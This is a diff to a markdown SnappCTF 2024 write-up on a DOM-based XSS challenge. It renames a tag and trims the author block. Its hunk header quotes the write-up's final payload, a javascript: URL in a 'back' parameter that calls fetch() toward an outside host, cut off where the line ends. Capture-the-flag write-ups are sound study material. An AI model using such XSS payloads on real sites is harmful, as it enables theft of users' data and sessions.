@@ -1,6 +1,6 @@
 ---
 tags:
-  - Snapp CTF
+  - SnappCTF
   - SnappCTF-2024
   - XSS
   - DOM-Based XSS
@@ -157,4 +157,5 @@ final addr: https://snappfal.spchallenge.ir/fal?back=javascript:fetch(`https://R
 
 
 !!! نویسنده
-    [amir303](https://x.com/amir3O3)$~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$تاریخ نگارش ۱۴۰۲/۱۲/۰۵
+    [amir303](https://x.com/amir3O3)
+
